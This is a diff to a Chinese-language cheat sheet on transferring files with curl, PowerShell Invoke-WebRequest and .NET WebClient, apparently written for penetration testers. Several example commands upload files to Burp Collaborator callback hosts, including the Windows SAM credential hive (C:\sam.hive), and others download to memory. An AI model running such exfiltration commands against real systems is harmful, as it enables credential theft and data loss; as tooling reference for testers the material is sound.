@@ -27,11 +27,11 @@ curl -d "user=admin&passwd=12345678" http://127.0.0.1:8080/login
 文件表单post，使用-F指定需要上传的文件。
 
 ```bash
-curl http://oumchirx584vuu5tk4stk8rcy34tsi.burpcollaborator.net -F "6379.txt=@6379.txt"
+curl http://oumchi.burpcollaborator.net -F "6379.txt=@6379.txt"
 
 # 发送出的请求如下：
 # POST / HTTP/1.1
-# Host: oumchirx584vuu5tk4stk8rcy34tsi.burpcollaborator.net
+# Host: oumchi.burpcollaborator.net
 # User-Agent: curl/7.58.0
 # Accept: */*
 # Content-Length: 1978
@@ -53,6 +53,12 @@ curl http://oumchirx584vuu5tk4stk8rcy34tsi.burpcollaborator.net -F "6379.txt=@63
 
 # --------------------------c9011604f054ee36--
 
+```
+
+* put
+
+```bash
+curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
 ```
 
 * 其它方法测试
@@ -89,6 +95,25 @@ curl ftp://user:passwd@ftpserver.com:port/path/
 curl –u name:passwd ftp://www.xxx.com/ -X 'DELE mp3/size.mp3'
 ```
 
+### 3.其他
+
+```ba&#39;sh
+-u, --user <user:password> 需要口令验证的http或ftp
+--ntlm 使用htlm认证
+-A, --user-agent <name> 指定请求头中的user-agent字段
+--socks5 <host[:port]> 使用sockes5代理
+-x, --proxy [protocol://]host[:port] 使用http/https代理
+ 
+--post301       Do not switch to GET after following a 301 不跳转301
+--post302       Do not switch to GET after following a 302 不跳转302
+--post303       Do not switch to GET after following a 303 不跳转303
+
+```
+
+
+
+
+
 ## 0x02 Windows中的curl
 
 powershell 中的curl是`Invoke-WebRequest`，它的另一个别名是wget。它是使用`-Headers <IDictionary>`来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过`-UserAgent <String>`指定。
@@ -116,7 +141,7 @@ Invoke-WebRequest -Uri "https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfp
 在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。
 
 ```powershell
-curl http://lti9gfqu453str4qj1rqj5q9x03rrg.burpcollaborator.net -Method post -Body "user=admin&passwd=12345678" 
+curl http://lti9gf.burpcollaborator.net -Method post -Body "user=admin&passwd=12345678" 
 ```
 
 * **put**
@@ -124,7 +149,7 @@ curl http://lti9gfqu453str4qj1rqj5q9x03rrg.burpcollaborator.net -Method post -Bo
 如果服务器支持put方法，可以直接put上传文件
 
 ```powershell
-curl http://lti9gfqu453str4qj1rqj5q9x03rrg.burpcollaborator.net -Method put -InFile ‪C:\sam.hive
+curl http://lti9gf.burpcollaborator.net -Method put -InFile ‪C:\sam.hive
 ```
 
 ### 2.ftp
@@ -135,3 +160,35 @@ curl http://lti9gfqu453str4qj1rqj5q9x03rrg.burpcollaborator.net -Method put -InF
 curl ftp://user:password@127.0.0.1:21/s2-057.py -outFile s2-057.py
 ```
 
+## 0x03 net.webclient
+
+在powershell4.0以前没有提供`Invoke-WebRequest`,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。
+
+```powershell
+#ftp下载
+(New-Object System.Net.WebClient).downloadfile('ftp://admin:admin@172.28.100.68/ppt.txt','ppt.txt')
+
+#ftp上传
+(New-Object System.Net.WebClient).uploadfile('ftp://admin:admin@172.28.100.68/ppt1.txt','ppt.txt')
+
+#http上传
+(New-Object System.Net.WebClient).uploadfile('http://8060wg.burpcollaborator.net','ppt.txt')
+
+#http下载文件
+(New-Object System.Net.WebClient).downloadfile('http：//172.28.100.68/ppt.txt','ppt.txt')
+
+#下载到内存
+$response=(New-Object System.Net.WebClient).downloadstring('http：//172.28.100.68/ppt.txt')#得到string
+$response=(New-Object System.Net.WebClient).downloaddata('http：//172.28.100.68/ppt.txt')#得到byte[]
+#从内存上传
+(New-Object System.Net.WebClient).uploadstring('http://8060wg.burpcollaborator.net',$response)
+(New-Object System.Net.WebClient).uploaddata('http://8060wg.burpcollaborator.net',$response)
+
+#指定请求头
+$mywebclient=(New-Object System.Net.WebClient);
+$mywebclient.Headers.Add("Cookie"," HMACCOUNT=057DAB164B4FC7D1; BAIDUID=3C7BA5C29716B9F251F8BC090E0BF028:FG=1; BIDUPSID=3C7BA5C29716B9F251F8BC090E0BF028; PSTM=1532227383")
+$mywebclient.Headers.Add("Referer","https://newtab.firefoxchina.cn/world-tab-index.html")
+$mywebclient.downloadstring('http://8060wg.burpcollaborator.net')
+
+
+```
